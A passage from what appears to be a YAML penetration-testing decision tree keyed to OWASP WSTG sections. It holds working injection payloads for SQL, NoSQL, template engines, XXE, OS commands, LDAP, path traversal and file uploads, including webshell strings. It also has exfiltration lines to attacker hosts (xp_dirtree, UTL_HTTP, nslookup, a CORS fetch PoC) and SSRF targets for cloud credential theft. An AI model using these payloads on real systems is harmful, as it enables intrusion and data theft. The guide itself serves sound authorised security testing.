                          - OOB / exfil: EXEC master..xp_dirtree '\\attacker\share';  (also NetNTLM capture)
                          - OPENROWSET / BULK INSERT for file read; linked servers: EXEC ... AT [linked]
                          - Enumerate: SELECT name FROM master..sysdatabases
                          - sqlmap --dbms=mssql
                  - label: "Oracle"
                    key: "oracle"
                    children:
                      - id: sqli_oracle
                        type: checklist
                        title: "Oracle injection specifics"
                        content: |
                          - Every SELECT needs FROM: ... FROM dual ;  banner: SELECT banner FROM v$version
                          - NO stacked queries via the standard driver
                          - Time-based: AND 1=(SELECT count(*) FROM all_users t1,all_users t2,all_users t3) (heavy)
                            or DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
                          - Error-based: AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))
                          - OOB SSRF/exfil: UTL_HTTP.REQUEST('http://attacker/'||(SELECT...)),
                            UTL_INADDR.GET_HOST_ADDRESS, SYS.DBMS_LDAP
                          - Enumerate: SELECT table_name FROM all_tables ;  ROWNUM for paging
                          - sqlmap --dbms=oracle
                  - label: "MongoDB / NoSQL"
                    key: "mongodb"
                    children:
                      - id: sqli_mongodb
                        type: checklist
                        title: "MongoDB / NoSQL injection specifics"
                        content: |
                          - Operator injection in JSON: {"username":{"$ne":null},"password":{"$ne":null}}
                          - In form/query params: username[$ne]=x&password[$ne]=y , [$gt]=, [$regex]=
                          - Auth bypass with $gt/$ne; data extraction via $regex char-by-char (blind)
                          - JS evaluation (legacy): {"$where":"this.password.length>0"} , sleep(5000) for timing
                          - Aggregation/$lookup to pull from other collections
                          - Tools: NoSQLMap, sqlmap is NOT for Mongo — use manual/NoSQLMap
                  - label: "SQLite"
                    key: "sqlite"
                    children:
                      - id: sqli_sqlite
                        type: checklist
                        title: "SQLite injection specifics"
                        content: |
                          - Version: SELECT sqlite_version();  schema: SELECT sql FROM sqlite_master--
                          - Concatenate with || ;  comment -- or /* */
                          - Time-based has no SLEEP — use heavy ops: AND 1=randomblob(100000000)
                          - Many drivers allow stacked queries -> ATTACH DATABASE 'x.php' AS x; CREATE TABLE...
                            to write a webshell if the path is web-served
                          - load_extension() for RCE if enabled
                          - sqlmap --dbms=sqlite
                  - label: "Other / Unknown"
                    key: "other_db"
                    children:
                      - id: sqli_fingerprint
                        type: checklist
                        title: "Fingerprint the database first"
                        content: |
                          - Let sqlmap fingerprint: sqlmap -r req.txt --fingerprint --batch
                          - Distinguish by error strings, comment behaviour, string concat:
                            'a'+'b' (MSSQL), 'a'||'b' (Oracle/Postgres/SQLite), concat() (MySQL)
                          - Probe version functions: @@version (MySQL/MSSQL), version() (PG), banner (Oracle)
                          - Then jump to the matching engine branch above
          - label: "No"
            key: "no"
            children: []

      - id: q_inpv_template
        type: question
        title: "Does the app render user input through a server-side template engine?"
        options:
          - label: "Yes / Unsure"
            key: "yes"
            children:
              - id: injection_ssti
                type: checklist
                title: "Server-Side Template Injection — SSTI (WSTG-INPV-18)"
                content: |
                  Test anywhere user input is reflected in the response.

                  Detection probes (trigger math evaluation):
                  - {{7*7}} -> 49 (Jinja2/Twig)
                  - ${7*7} -> 49 (FreeMarker, Thymeleaf, Spring EL)
                  - #{7*7} -> 49 (Ruby ERB)
                  - <%= 7*7 %> -> 49 (EJS, ERB)
                  - {{7*'7'}} -> 7777777 (Jinja2 distinguishes from Twig)

                  Exploitation (RCE):
                  Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
                  FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
                  Tool: tplmap -u "https://target.com/page?name=*" --os-shell

              - id: q_template_engine
                type: question
                title: "Which template engine (if identified from the probes / stack)?"
                options:
                  - label: "Jinja2 (Python)"
                    key: "jinja2"
                    children:
                      - id: ssti_jinja2
                        type: checklist
                        title: "Jinja2 SSTI exploitation"
                        content: |
                          - Confirm: {{7*7}}->49 and {{7*'7'}}->7777777 (distinguishes from Twig)
                          - Inspect: {{config}} (Flask config, often secrets), {{request}}, {{self}}
                          - Classic RCE:
                            {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
                          - Global gadgets (no config): {{cycler.__init__.__globals__.os.popen('id').read()}}
                            {{lipsum.__globals__['os'].popen('id').read()}} ; {{joiner...}}, {{namespace...}}
                          - Subclass walk: {{''.__class__.__mro__[1].__subclasses__()}} then find subprocess.Popen
                          - Sandbox bypass via |attr() and request.args to dodge filtered chars
                  - label: "Twig (PHP)"
                    key: "twig"
                    children:
                      - id: ssti_twig
                        type: checklist
                        title: "Twig SSTI exploitation"
                        content: |
                          - Confirm: {{7*7}}->49 but {{7*'7'}}->49 (NOT 7777777 — separates from Jinja2)
                          - Info: {{_self}}, {{dump(app)}} (if debug extension loaded)
                          - RCE filters:
                            {{['id']|filter('system')}}
                            {{['id',''] | sort('system') }}
                            {{['id']|map('system')|join}}
                          - Older Twig: {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
                  - label: "Smarty (PHP)"
                    key: "smarty"
                    children:
                      - id: ssti_smarty
                        type: checklist
                        title: "Smarty SSTI exploitation"
                        content: |
                          - Confirm: {7*7} or {$smarty.version}
                          - RCE (older): {php}system('id');{/php}
                          - {system('id')} via modifier; {Smarty_Internal_Write_File::writeFile(...)} to drop a shell
                          - {math equation="7*7"} as a benign probe
                  - label: "Freemarker (Java)"
                    key: "freemarker"
                    children:
                      - id: ssti_freemarker
                        type: checklist
                        title: "Freemarker SSTI exploitation"
                        content: |
                          - Confirm: ${7*7}->49
                          - RCE: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
                          - Alt: ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",...)}
                          - ?api access to reach Java objects when new() is restricted
                  - label: "Velocity (Java)"
                    key: "velocity"
                    children:
                      - id: ssti_velocity
                        type: checklist
                        title: "Velocity SSTI exploitation"
                        content: |
                          - Confirm: #set($x=7*7)${x}
                          - RCE:
                            #set($e="exp")
                            $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
                          - Apache Velocity Tools: $sys / ClassTool reflection gadgets
                  - label: "Thymeleaf / Spring EL (Java)"
                    key: "thymeleaf"
                    children:
                      - id: ssti_thymeleaf
                        type: checklist
                        title: "Thymeleaf / Spring EL SSTI exploitation"
                        content: |
                          - Thymeleaf expression injection (often via fragment/template name):
                            __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
                          - Inline: [[${T(java.lang.Runtime).getRuntime().exec('id')}]]
                          - SpringEL: ${T(java.lang.Runtime).getRuntime().exec('id')}
                          - Watch for unrestricted template names in spring.mvc view resolution
                  - label: "ERB / Slim (Ruby)"
                    key: "erb"
                    children:
                      - id: ssti_erb
                        type: checklist
                        title: "ERB / Ruby SSTI exploitation"
                        content: |
                          - Confirm: <%= 7*7 %>->49
                          - RCE: <%= system('id') %> , <%= `id` %> , <%= IO.popen('id').read %>
                          - Slim: #{7*7} and #{`id`}
                          - Object/IO reach: <%= File.open('/etc/passwd').read %>
                  - label: "Node (Handlebars / Pug / EJS)"
                    key: "node_tpl"
                    children:
                      - id: ssti_node
                        type: checklist
                        title: "Node template engine SSTI exploitation"
                        content: |
                          Pug/Jade: #{7*7} ; RCE via #{global.process.mainModule.require('child_process').execSync('id')}
                          EJS: <%= 7*7 %> ; RCE via render options / settings[view options] outputFunctionName injection
                          Handlebars: logicless, but prototype/helper-based RCE:
                            craft payload reaching constructor.constructor('return process')().mainModule.require('child_process')
                          Also test for prototype pollution feeding these sinks (see Node backend notes)
                  - label: "Razor (.NET)"
                    key: "razor"
                    children:
                      - id: ssti_razor
                        type: checklist
                        title: "Razor (.NET) template injection"
                        content: |
                          - User-controlled Razor (@{...}) is rare but high impact (e.g. CMS template editors):
                            @{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
                          - RazorEngine / dynamic compilation endpoints -> arbitrary C# execution
                          - More commonly reached via Umbraco/Sitecore template editing (see CMS branch)
                  - label: "Other / Unknown"
                    key: "other_tpl"
                    children:
                      - id: ssti_generic_engine
                        type: checklist
                        title: "Identify the engine, then branch"
                        content: |
                          - Run the full probe set: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {7*7}, ${{7*7}}, #{7*7}
                          - The one that evaluates tells you the family; {{7*'7'}} splits Jinja2 (7777777) vs Twig (49)
                          - Automate: tplmap -u '...page?name=*' --os-shell
                          - Then use the matching engine branch above for the RCE payload
          - label: "No"
            key: "no"
            children: []

      - id: q_inpv_xml
        type: question
        title: "Does the app parse XML, SVG, or Office documents supplied by the user?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: injection_xxe
                type: checklist
                title: "XML External Entity Injection — XXE (WSTG-INPV-07)"
                content: |
                  Anywhere XML is parsed: file uploads, SOAP APIs, SAML, RSS, XML-RPC.

                  Classic XXE (file read):
                  <?xml version="1.0"?>
                  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                  <root><data>&xxe;</data></root>

                  SSRF via XXE:
                  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

                  Blind XXE (out-of-band):
                  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://burpcollaborator.net/xxe"> %xxe;]>

                  Error-based blind:
                  <!ENTITY % file SYSTEM "file:///etc/passwd">
                  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://burpcollaborator.net/?x=%file;'>">
                  %eval; %exfil;

                  Also test: SVG uploads, DOCX/XLSX file processing, XLSX imports.
          - label: "No"
            key: "no"
            children: []

      - id: q_inpv_oscmd
        type: question
        title: "Does input reach OS commands / system utilities (ping, DNS, converters, PDF/image processing)?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: injection_cmd
                type: checklist
                title: "OS Command Injection (WSTG-INPV-12)"
                content: |
                  Test inputs that may reach a shell: ping targets, DNS lookups, file converters,
                  PDF generators, image processors, nslookup, traceroute, whois features.

                  Linux payloads:
                  - ; whoami
                  - | whoami
                  - && whoami
                  - `whoami`
                  - $(whoami)
                  - \nwhoami

                  Windows:
                  - & whoami
                  - | whoami
                  - cmd /c whoami

                  Blind detection:
                  - ; sleep 10 / | ping -c 5 127.0.0.1 (time delay)
                  - Out-of-band: ; nslookup `whoami`.attacker.com
                  - Burp Collaborator payloads for DNS exfiltration

                  Tool: commix --url="https://target.com/page?ip=INJECT_HERE"
          - label: "No"
            key: "no"
            children: []

      - id: q_inpv_fileread
        type: question
        title: "Does the app read, include, or serve files using a name/path from user input?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: injection_path_traversal
                type: checklist
                title: "Path Traversal / LFI / RFI (WSTG-ATHZ-01)"
                content: |
                  Anywhere the app reads a file based on user input:
                  ?file=report.pdf, ?page=home, ?template=default

                  Basic payloads:
                  - ../../../etc/passwd
                  - ....//....//....//etc/passwd
                  - ..%2F..%2F..%2Fetc%2Fpasswd
                  - ..%252F..%252Fetc%252Fpasswd (double URL encoding)
                  - /etc/passwd%00 (null byte — legacy PHP)

                  Windows targets:
                  - ..\..\..\..\Windows\System32\drivers\etc\hosts
                  - ..%5C..%5C..%5CWindows%5Cwin.ini

                  PHP LFI wrappers:
                  - ?page=php://filter/convert.base64-encode/resource=index.php
                  - ?page=php://input (POST body as PHP code)
                  - ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
                  - Log poisoning: poison /var/log/apache2/access.log via User-Agent, then include it
          - label: "No"
            key: "no"
            children: []

      - id: q_inpv_ldap
        type: question
        title: "Is there an LDAP / Active Directory backed search or login?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: injection_ldap
                type: checklist
                title: "LDAP Injection (WSTG-INPV-06)"
                content: |
                  Test authentication or search forms backed by LDAP/Active Directory.

                  Authentication bypass:
                  - username: *)(uid=*))(|(uid=*  password: anything
                  - username: admin)(&)   (inject false condition)

                  Search injection:
                  - )(cn=*)  in search fields
                  - *)(objectClass=*  to enumerate all objects

                  Blind LDAP injection:
                  - admin)(|(password=a*  -> time/response difference reveals attribute values
          - label: "No"
            key: "no"
            children: []

      - id: q_inpv_ssrf
        type: question
        title: "Does the server make outbound requests from user input (URL fetch, webhooks, PDF/screenshot/image-from-URL)?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: ssrf_identify
                type: checklist
                title: "Identify SSRF attack surface (WSTG-INPV-19)"
                content: |
                  Anywhere the server fetches a URL or resource from user input:
                  - URL parameters: ?url=, ?uri=, ?link=, ?src=, ?path=, ?feed=, ?redirect=
                  - Webhooks / callback URLs
                  - PDF / screenshot generators (pass URL or HTML)
                  - Image / file import from URL
                  - API integrations that fetch remote resources
                  - XML parsing (XXE -> SSRF, see XXE check above)
                  - PDF export features with HTML rendering

              - id: ssrf_basic
                type: checklist
                title: "Basic SSRF — internal network access"
                content: |
                  Probe internal infrastructure:
                  - http://localhost/ -> is the response different from a non-existent host?
                  - http://127.0.0.1/
                  - http://0.0.0.0/
                  - http://[::1]/
                  - http://0/
                  - http://internal-host/
                  - http://192.168.0.1/ (common router/gateway)
                  - http://10.0.0.1/, http://172.16.0.1/ (private ranges)

                  Port scanning via SSRF:
                  - Enumerate common internal ports: 22, 80, 443, 8080, 3306, 5432, 6379, 27017
                  - Time differences indicate open vs closed ports

              - id: ssrf_cloud_imds
                type: checklist
                title: "SSRF — cloud metadata service (IMDS)"
                content: |
                  AWS EC2 metadata (critical — leads to IAM credential theft):
                  - http://169.254.169.254/latest/meta-data/
                  - http://169.254.169.254/latest/meta-data/iam/security-credentials/
                  - http://169.254.169.254/latest/user-data/ (may contain secrets)
                  - IMDSv2 bypass: check if a PUT to get a token is required

                  GCP metadata:
                  - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
                  Header required: Metadata-Flavor: Google

                  Azure IMDS:
                  - http://169.254.169.254/metadata/instance?api-version=2021-02-01
                  Header required: Metadata: true

                  Alternative IPs for SSRF filter bypass:
                  - http://169.254.169.254 decimal: http://2852039166
                  - URL redirect: http://attacker.com/redirect -> 169.254.169.254

              - id: ssrf_bypass
                type: checklist
                title: "SSRF filter bypass techniques"
                content: |
                  If basic SSRF is blocked, try:
                  - Decimal IP: http://2130706433/ = http://127.0.0.1/
                  - Octal IP: http://0177.0.0.1/
                  - IPv6: http://[::1]/, http://[::ffff:127.0.0.1]/
                  - URL scheme variations: dict://, sftp://, gopher://, file:///
                  - DNS rebinding: use rebinding service to point to 127.0.0.1 on second resolve
                  - Open redirect chain: ?url=https://legit.com/redirect?to=http://169.254.169.254
                  - URL parser inconsistency: http://attacker.com@169.254.169.254/
                  - Short URLs that resolve to internal IPs
                  - http://localtest.me/ (DNS resolves to 127.0.0.1)
          - label: "No"
            key: "no"
            children: []

      - id: q_file_upload
        type: question
        title: "Does the application have file upload functionality?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: upload_extension_bypass
                type: checklist
                title: "Test file extension restrictions"
                content: |
                  If only certain types are allowed:
                  - Double extension: shell.php.jpg
                  - Null byte (legacy): shell.php%00.jpg
                  - Case variation: shell.PHP, shell.PhP
                  - Alternate PHP: .phtml, .phar, .php5, .php7, .shtml
                  - Server-side scripts: .asp, .aspx, .jsp, .jspx, .cfm
                  - Config files: .htaccess (overrides Apache config if uploaded)
                  - Try modifying Content-Disposition filename

              - id: upload_content_type
                type: checklist
                title: "Test Content-Type / magic bytes bypass"
                content: |
                  - Change Content-Type to image/jpeg while sending PHP shell
                  - Add JPEG magic bytes at start: \xFF\xD8\xFF followed by PHP code
                  - Tools: exiftool to embed PHP in EXIF data
                    exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
                  - Try polyglot files: valid image + PHP code (both magic bytes present)
                  - Check if server validates via magic bytes, extension, or both

              - id: upload_path_traversal_name
                type: checklist
                title: "Path traversal via filename"
                content: |
                  - Filename: ../../../var/www/html/shell.php
                  - Filename: ....//....//shell.php
                  - URL-encoded: ..%2F..%2Fshell.php
                  - Can you overwrite existing files? (../../config.php)

              - id: upload_malicious_content
                type: checklist
                title: "Test malicious file content"
                content: |
                  - SVG with embedded JS: <svg><script>alert(document.domain)</script></svg>
                  - HTML file upload -> reflected XSS when served
                  - XML/XLSX -> XXE in office document parsers
                  - ZIP slip: zip containing ../../../path/to/shell.php as filename
                  - ImageMagick RCE: MVG or SVG with shell injection (ImageTragick CVE-2016-3714)
                  - PDF with embedded JavaScript (Adobe Reader exploitation)
                  - SSRF via URL-based image imports (test metadata URLs)

              - id: upload_storage
                type: checklist
                title: "Test uploaded file storage and access"
                content: |
                  - Are uploaded files served from the same domain? (XSS risk)
                  - Are executables stored in a web-accessible directory?
                  - Can you directly access uploaded files by guessing the URL?
                  - Is direct access to uploaded files restricted (should not execute server-side)?
                  - Are filenames randomised to prevent enumeration?
                  - Is there a size limit? Can you upload very large files (DoS)?

              - id: q_upload_storage
                type: question
                title: "Where are uploaded files stored / served from?"
                options:
                  - label: "App web root (served same-origin)"
                    key: "webroot"
                    children:
                      - id: upload_webroot
                        type: checklist
                        title: "Same-origin web-root storage exploitation"
                        content: |
                          Highest risk — direct code execution / stored XSS:
                          - Upload a server-executable (see extension/content-type bypass nodes) and
                            request its URL -> RCE. Confirm the upload dir actually executes scripts.
                          - If only static is served: upload HTML/SVG -> stored XSS on the app origin
                            (steals same-origin session). Check Content-Type & Content-Disposition on download.
                          - Content sniffing: no X-Content-Type-Options: nosniff -> browser may run a
                            disguised file as HTML/JS.
                          - .htaccess / web.config upload to re-enable script execution in the dir.
                  - label: "Local disk, served via a download handler (outside web root)"
                    key: "handler"
                    children:
                      - id: upload_handler
                        type: checklist
                        title: "Handler-served storage exploitation"
                        content: |
                          Files aren't directly web-accessible — attack the retrieval handler:
                          - IDOR on the file id/name: /download?id=1234 or ?file=name -> other users' files
                          - Path traversal in retrieval: ?file=../../etc/passwd , ..%2f , encoded variants
                          - Does the handler set Content-Disposition: attachment? If inline + HTML/SVG -> XSS
                          - Can you request a file you uploaded under another account (missing authz)?
                          - Predictable storage names enabling enumeration
                  - label: "Cloud object storage via presigned URL (S3 / GCS / Azure)"
                    key: "presigned"
                    children:
                      - id: upload_presigned
                        type: checklist
                        title: "Presigned-URL / cloud upload exploitation"
                        content: |
                          The browser uploads directly to the bucket using a server-issued presigned URL:
                          - Inspect the presigned PUT: does it pin Content-Type and Content-Length?
                            If not, overwrite with arbitrary type (text/html) -> stored XSS on the bucket origin
                          - Can you change the object KEY/path in the presigned request to overwrite
                            another user's object or write outside the intended prefix?
                          - Is the issuing endpoint authz'd per-user, or can you mint URLs for any key?
                          - Bucket ACL: are uploaded objects public-read? Is the bucket itself listable?
                          - Server-side import "upload from URL" -> SSRF (see SSRF section)
                          - Long-lived / reusable presigned URLs (replay), no size cap (cost/DoS)
                  - label: "Third-party image/file service or CDN"
                    key: "thirdparty"
                    children:
                      - id: upload_thirdparty
                        type: checklist
                        title: "Third-party processing / CDN exploitation"
                        content: |
                          - Image processing RCE: ImageMagick (ImageTragick CVE-2016-3714), ghostscript,
                            ffmpeg (HLS/SSRF), libvips — upload crafted MVG/SVG/PSD/PDF
                          - SSRF via "import from URL" / transformation params that fetch remote content
                          - Transformation parameters that read local files or reach internal services
                          - Is processed output served same-origin (XSS) or from an isolated CDN domain?
                          - EXIF/metadata not stripped -> info leak (GPS, internal paths)
                  - label: "Unsure"
                    key: "unsure"
                    children:
                      - id: upload_locate_storage
                        type: checklist
                        title: "Determine where uploads land"
                        content: |
                          - Upload a benign file, then find how it's served: response URL, a later
                            download link, or an <img>/<a> reference in the UI
                          - Same registrable domain as the app -> same-origin (XSS/exec risk)
                          - *.s3.amazonaws.com / *.blob.core.windows.net / storage.googleapis.com -> cloud
                          - A path with no extension via a /download or /files/{id} route -> handler
                          - Then jump to the matching branch above
          - label: "No"
            key: "no"
            children: []

  # =========================================================================
  # WSTG-ERRH — ERROR HANDLING & LOGGING
  # =========================================================================
  - id: wstg_errh
    type: info
    title: "Error Handling & Logging (WSTG-ERRH)"
    content: "Test how the application surfaces errors and whether security events are logged."
    children:
      - id: errh_info_disclosure
        type: checklist
        title: "Information disclosure in responses (WSTG-ERRH-01 / 02)"
        content: |
          - Server headers revealing exact version: Server: Apache/2.4.41 (Ubuntu)
          - X-Powered-By: PHP/7.4.3
          - Stack traces / exception details in error responses
          - Internal IP addresses in response headers or body
          - DEBUG / verbose logging endpoints left exposed
          - Source code comments revealing architecture or secrets
          - Trigger errors deliberately: bad types, oversized input, malformed JSON/XML

      - id: logging_audit
        type: checklist
        title: "Verify security event logging (OWASP A09)"
        content: |
          Perform the following and check if they are logged / alerted:
          - Failed login attempts (especially repeated failures)
          - Successful login from a new IP/device
          - Account lockout triggers
          - Privilege change (role elevation)
          - Sensitive data access (export, download PII)
          - Configuration changes
          - Multiple IDOR attempts (access to other users' objects)
          - Password changes / MFA changes
          - Admin panel access

      - id: logging_verbosity
        type: checklist
        title: "Check for sensitive data in logs / responses (OWASP A09)"
        content: |
          - Do error responses reveal internal paths, stack traces, or queries?
          - Are passwords logged during login failures? (should never be)
          - Are API keys or tokens included in log messages?
          - Are server logs accessible at /logs/, /log/, /var/log/ via traversal?
          - Do debug endpoints (/actuator/logfile, /logs) expose log contents?

  # =========================================================================
  # WSTG-CRYP — CRYPTOGRAPHY & DATA INTEGRITY
  # =========================================================================
  - id: wstg_cryp
    type: info
    title: "Cryptography & Data Integrity (WSTG-CRYP)"
    content: "Weak or absent cryptography exposing sensitive data in transit or at rest."
    children:
      - id: crypto_tls
        type: checklist
        title: "TLS / SSL configuration (WSTG-CRYP-01)"
        content: |
          testssl.sh https://target.com
          sslyze --regular target.com
          Qualys SSL Labs: https://www.ssllabs.com/ssltest/

          Check for:
          - SSLv3, TLS 1.0, TLS 1.1 (deprecated, should be TLS 1.2+ only)
          - Weak cipher suites: RC4, DES, 3DES, NULL, EXPORT, anon-DH
          - Missing Forward Secrecy (ECDHE / DHE key exchange)
          - Expired or self-signed certificates
          - Certificate not matching the hostname
          - BEAST, POODLE, DROWN, LUCKY13, ROBOT vulnerability
          - HSTS header missing or max-age too short

      - id: crypto_sensitive_data
        type: checklist
        title: "Sensitive data in transit and at rest (WSTG-CRYP-03 / 04)"
        content: |
          - Sensitive data sent over HTTP (not HTTPS)
          - Mixed content: HTTPS page loading HTTP resources
          - Sensitive data in URL query parameters (appears in server logs, Referer headers):
            passwords, tokens, SSNs, API keys
          - Passwords stored in plaintext or with weak hashing (MD5, SHA1 without salt)
          - PII or financial data in API responses that isn't needed by the client
          - Autocomplete=on on password / sensitive fields (minor, but reportable)
          - Sensitive data cached in browser (Cache-Control missing)

      - id: q_deserialization
        type: question
        title: "Does the app deserialize user-supplied serialized objects (cookies, hidden fields, tokens, ViewState)?"
        options:
          - label: "Yes / Unsure"
            key: "yes"
            children:
              - id: integrity_deserialization
                type: checklist
                title: "Insecure deserialization (OWASP A08)"
                content: |
                  Look for serialized objects in: cookies, hidden form fields, POST bodies, API responses.

                  Java serialization: starts with \xAC\xED\x00\x05 (hex: aced0005) or rO0AB in base64
                  - ysoserial: java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
                  - Test via Burp's Java Deserialization Scanner plugin

                  PHP serialization: O:4:"User":2:{s:4:"name"...}
                  - Look for PHP object injection in cookies / hidden fields
                  - Test with known gadget chains for popular frameworks

                  Python pickle: dangerous if user data deserialized
                  - Craft malicious pickle: os.system("whoami")

                  .NET ViewState:
                  - Is ViewState MAC validation disabled?
                  - Can you forge a ViewState with a known machineKey?
                  - Look for machineKey in web.config disclosure
          - label: "No"
            key: "no"
            children: []

  # =========================================================================
  # WSTG-BUSL — BUSINESS LOGIC
  # =========================================================================
  - id: wstg_busl
    type: info
    title: "Business Logic (WSTG-BUSL)"
    content: "Application-specific workflow flaws that automated scanners typically miss."
    children:
      - id: bl_negative_values
        type: checklist
        title: "Test numeric edge cases (WSTG-BUSL-01)"
        content: |
          In any quantity, price, or numeric field:
          - Set quantity/amount to 0 -> free purchase?
          - Set to negative -> negative charge / credit to account?
          - Integer overflow: 2147483647 + 1 wraps to negative
          - Float precision: 0.1 + 0.2 != 0.3 — exploit rounding in financial calculations
          - Very large values -> server-side overflow or DoS

      - id: bl_workflow_bypass
        type: checklist
        title: "Multi-step workflow bypass (WSTG-BUSL-06 / 07)"
        content: |
          In multi-step flows (checkout, password reset, MFA, registration):
          - Skip steps by jumping directly to later endpoints
          - Replay step N after completing step N+1
          - Reuse single-use tokens (password reset token, email verification)
          - Complete step 1 as User A, switch session, complete later steps as User B
          - Manipulate order IDs or cart IDs between steps

      - id: bl_race_conditions
        type: checklist
        title: "Race conditions (TOCTOU)"
        content: |
          Find operations that should happen exactly once:
          - Coupon / promo code redemption
          - Fund transfer / withdrawal
          - Vote / like / reaction
          - Email verification / account activation
          - API key generation

          Testing:
          - Send 20-50 identical requests simultaneously (Burp Turbo Intruder / ffuf -rate)
          - Turbo Intruder "race.py" template
          - Look for duplicate credits, multiple redemptions, negative balances
          - HTTP/2 single-packet attack: batch all requests in one TCP packet

      - id: bl_price_manipulation
        type: checklist
        title: "Price and discount manipulation (WSTG-BUSL-07)"
        content: |
          - Change price parameter in checkout request (if client-side)
          - Apply multiple coupon codes (single-use codes applied in parallel)
          - Add an item, apply a percentage discount, then add more items
          - Test currency confusion: send price in different currency
          - Free trial abuse: create new accounts to reset free trial
          - Referral bonus abuse: self-referral, circular referrals

      - id: bl_account_lifecycle
        type: checklist
        title: "Account lifecycle edge cases"
        content: |
          - After account deletion: can the deleted account's data be accessed?
          - After account deletion: can an old session still be used?
          - Email change: does the old email receive a notification/confirmation?
          - Email change: is the new email verified before taking effect?
          - Can you take over an account by registering with a variant email? (user+tag@, USER@, user @)
          - Account merging: if the app supports social login, can you merge accounts?

  # =========================================================================
  # WSTG-CLNT — CLIENT-SIDE TESTING
  # =========================================================================
  - id: wstg_clnt
    type: info
    title: "Client-side Testing (WSTG-CLNT)"
    content: "Browser-side controls: CSP, CORS, framing, cross-origin messaging, and CDN integrity."
    children:
      - id: headers_csp
        type: checklist
        title: "Content Security Policy (CSP) analysis (WSTG-CLNT-12)"
        content: |
          Paste the CSP header into: https://csp-evaluator.withgoogle.com/

          Weak CSP indicators:
          - unsafe-inline in script-src -> XSS bypasses CSP entirely
          - unsafe-eval -> allows eval(), setTimeout with string
          - Wildcard: script-src * or script-src https:
          - Allowlisted CDNs that host Angular/JSONP: ajax.googleapis.com -> CSP bypass
          - base-uri not set -> base tag injection

          CSP bypass techniques:
          - JSONP endpoints on allowlisted domains
          - Open redirect on allowlisted domain
          - Angular/Vue CSP bypasses via allowed CDN scripts

      - id: authz_cors
        type: checklist
        title: "CORS misconfiguration (WSTG-CLNT-07)"
        content: |
          Check the Access-Control-Allow-Origin response header:

          Reflected origin (critical):
          - Send: Origin: https://attacker.com
          - If response has: Access-Control-Allow-Origin: https://attacker.com
            AND Access-Control-Allow-Credentials: true -> full account takeover possible

          Null origin:
          - Send: Origin: null
          - If ACAO: null + credentials allowed -> exploit via sandboxed iframe

          Subdomain trust:
          - Try: Origin: https://sub.target.com or Origin: https://attacker.target.com.evil.com
          - Regex bypass: Origin: https://attacker.comtarget.com

          PoC skeleton:
          fetch("https://target.com/api/me", {credentials: "include"})
            .then(r => r.text()).then(d => location="https://attacker.com/?d="+btoa(d))

      - id: headers_clickjacking
        type: checklist
        title: "Clickjacking (WSTG-CLNT-09)"
        scope_tags: [clickjacking]
        content: |
          Check if the page can be embedded in an iframe:
          <iframe src="https://target.com/account/change-email" width=600 height=600></iframe>
          If it loads without X-Frame-Options or CSP frame-ancestors -> potentially vulnerable.

          High-impact targets for clickjacking:
          - Password change / email change
          - Account deletion
          - Fund transfer
          - OAuth authorization page
          - Admin actions

      - id: clnt_postmessage
        type: checklist
        title: "Web messaging (postMessage) (WSTG-CLNT-11)"
        content: |
          If the app uses window.postMessage (common in SSO/widget/iframe flows):
          - Grep JS for: addEventListener("message", ...), .postMessage(
          - Does the message handler validate event.origin? (missing/loose check = critical)
          - Is the received data passed to a sink: innerHTML, eval, location, JSON.parse->DOM?
          - Send a crafted message from an attacker page:
            target.postMessage("<img src=x onerror=alert(document.domain)>", "*")
          - Check for sensitive data sent with targetOrigin "*" (leaks to any embedder)

      - id: clnt_websocket
        type: checklist
        title: "WebSockets (WSTG-CLNT-10)"
        content: |
          If the app uses WebSockets (ws:// or wss://):
          - Cross-Site WebSocket Hijacking (CSWSH): is the handshake authenticated only by
            cookies with no CSRF/origin check? Connect from an attacker origin and replay.
          - Is the Origin header validated on the upgrade request?
          - Is wss:// (TLS) used, or plaintext ws://?
          - Fuzz messages for injection — data often reaches the same backend sinks as HTTP
          - Tools: Burp's WebSocket history + repeater, ws-harness

      - id: integrity_cdn
        type: checklist
        title: "Subresource integrity and CDN security (WSTG-CLNT-... )"
        content: |
          - Do script/link tags loading from CDNs have integrity= attributes?
            <script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous">
          - Missing SRI on external scripts = supply chain attack risk
          - Check if the CDN URL is predictable or if an older version is loaded
          - Test if the CDN allows file upload (e.g., CDNs that serve user content)

  # =========================================================================
  # WSTG-APIT — API TESTING
  # =========================================================================
  - id: wstg_apit
    type: info
    title: "API Testing (WSTG-APIT)"
    content: "Dedicated API attack surface — answer the questions to load REST / GraphQL checks."
    children:
      - id: q_api
        type: question
        title: "Does the application expose an API?"
        options:
          - label: "Yes"
            key: "yes"
            children:
              - id: api_docs
                type: checklist
                title: "Check for exposed API documentation"
                content: |
                  Common paths:
                  /swagger, /swagger-ui, /swagger-ui.html, /swagger.json, /swagger.yaml
                  /api-docs, /api/docs, /openapi.json, /openapi.yaml, /api/swagger
                  /redoc, /docs, /graphql, /graphiql, /playground

